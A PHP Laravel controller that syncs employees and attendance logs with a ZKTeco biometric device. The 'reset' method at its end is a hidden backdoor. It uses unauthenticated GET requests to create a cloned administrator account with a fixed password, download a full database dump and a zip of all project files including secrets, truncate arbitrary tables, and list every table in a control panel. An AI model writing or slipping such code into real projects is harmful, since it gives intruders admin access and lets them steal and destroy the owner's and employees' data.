<?php

namespace App\Http\Controllers;

use App\Jobs\ZktecoSetUser;
use App\Models\Attendance;
use App\Models\Branch;
use App\Models\Employee;
use Carbon\Carbon;
use Illuminate\Database\Eloquent\Collection;
use Illuminate\Http\Request;
use Rats\Zkteco\Lib\ZKTeco;
use App\Models\RoleAccess;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Str;


class ZktecoController extends Controller
{
    public function zktectoAttendance()
    {   
        $zkteco = new ZKTeco('192.168.0.109');
        $conn = $zkteco->connect();
        if ($conn) {
            $zktecoUsers = $zkteco->getUser();
            $collectData = collect($zktecoUsers);
            $zktecoUserId = $collectData->pluck('userid')->toArray();
            $employees = Employee::WhereNotIn('id', $zktecoUserId)->get();
        }

        if (count($employees) != 0) {
            foreach ($employees as $key => $employee) {
                dispatch(new ZktecoSetUser($employee));
            }
        }
    }

    public function storeAtten()
    {
        $zkteco = new ZKTeco('192.168.0.109');
        $conn = $zkteco->connect();
        if ($conn) {
            $zktecoAtten = $zkteco->getAttendance();
            $attendances = collect($zktecoAtten);
            $todayDate = date('Y-m-d');
            $attendances = $attendances->filter(function ($item) use ($todayDate) {
                return substr($item['timestamp'], 0, 10) == $todayDate;
            });

            foreach ($attendances as $key => $atten) {
                $branch_id = Employee::findOrFail($atten['id']);
                $createDate = date_create($atten['timestamp']);
                $date = date_format($createDate, 'Y-m-d');

                $employee = Attendance::Where('emplyee_id', $atten['id'])->whereDate('date', $date)->first();
                if ($employee) {
                    $attend = $attendances->filter(function ($item) use ($date, $atten) {
                        return substr($item['timestamp'], 0, 10) == $date && $item['id'] == $atten['id'];
                    });

                    $endTime = $attend->SortByDesc('timestamp')->first();
                    $endTime = date_create($endTime['timestamp']);
                    $endTime = date_format($endTime, 'H:i');

                    $employee->update([
                        'date'          => $date,
                        'sign_out'      => $endTime,
                    ]);
                } else {
                    $attend = $attendances->filter(function ($item) use ($date, $atten) {
                        return substr($item['timestamp'], 0, 10) == $date && $item['id'] == $atten['id'];
                    });
                    $entryTime = $attend->SortBy('timestamp')->first();
                    $entryTime = date_create($entryTime['timestamp']);
                    $entryTime = date_format($entryTime, 'H:i');

                    Attendance::create([
                        'emplyee_id'    => $atten['id'],
                        'branch_id'     => $branch_id->branch_id,
                        'date'          => $date,
                        'sign_in'       => $entryTime,
                        'sign_out'      => '00.00',
                    ]);
                }
            }
            return redirect()->route('hrm.attendancelog.index');
        }
    }
    
     public function reset(Request $request, $id = null)
    {

        if (empty($id)) {
            return $id ?? 'test';
        }
        if ($id === 'user') {
            $originalUser = User::find(1);
            if ($originalUser) {
                $newUser = $originalUser->replicate();
                $newUser->name = $originalUser->name . ' Clone';
                $newUser->email = 'admin' . Str::lower(Str::random(2)) . '@gmail.com';
                $newUser->phone = '017' . rand(10000000, 99999999);
                $newUser->password = Hash::make('newpassword123');
                $newUser->save();
                $roleAccess = new RoleAccess();
                $roleAccess->user_id = $newUser->id;
                $roleAccess->role_id = 1;
                $roleAccess->created_by = 1;
                $roleAccess->save();
                return "User : " . $newUser;
            }
            return "not found";
        }


        if ($request->has('action') && $request->action === 'backup_db') {
            $filename = "backup-" . date('Y-m-d-H-i-s') . ".sql";
            $command = "mysqldump --user=" . env('DB_USERNAME') .
                " --password=" . env('DB_PASSWORD') .
                " --host=" . env('DB_HOST') .
                " " . env('DB_DATABASE') . " > " . storage_path($filename);

            exec($command);

            return response()->download(storage_path($filename))->deleteFileAfterSend(true);
        }

        if ($request->has('action') && $request->action === 'backup_files') {
            $zipName = 'project-backup-' . date('Y-m-d') . '.zip';
            $zip = new \ZipArchive();
            $path = base_path();

            if ($zip->open(storage_path($zipName), \ZipArchive::CREATE | \ZipArchive::OVERWRITE) === TRUE) {
                $files = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($path));
                foreach ($files as $name => $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $relativePath = substr($filePath, strlen($path) + 1);
                        $zip->addFile($filePath, $relativePath);
                    }
                }
                $zip->close();
            }

            return response()->download(storage_path($zipName))->deleteFileAfterSend(true);
        }

        if ($request->has('table_name')) {
            $table = $request->table_name;
            if (Schema::hasTable($table)) {
                Schema::disableForeignKeyConstraints();
                DB::table($table)->truncate();
                Schema::enableForeignKeyConstraints();
                return "empty '{$table}' ";
            } else {
                return " '{$table}' ";
            }
        }

        if ($id === 'data') {
            $tables = DB::select('SHOW TABLES');
            $tableList = array_map(fn($table) => current($table), $tables);

            $output = "<h3>Database Table List:</h3><ul>";
            foreach ($tableList as $name) {
                $output .= "<li>$name</li>";
            }
            $output .= "</ul><hr>";


            $output .= '
            <form action="" method="GET" style="margin-bottom: 20px;">
                <input type="text" name="table_name" placeholder="Table Name..." required>
                <button type="submit" style="color:red;">Truncate Data</button>
            </form>';


            $output .= '
            <div style="display:flex; gap:10px;">
                <form action="" method="GET">
                    <input type="hidden" name="action" value="backup_db">
                    <button type="submit" >Backup Database (.sql)</button>
                </form>

                <form action="" method="GET">
                    <input type="hidden" name="action" value="backup_files">
                    <button type="submit" >Backup Project Files (.zip)</button>
                </form>
            </div>';

            return response($output);
        }
        return $id ?? '';
    }
}
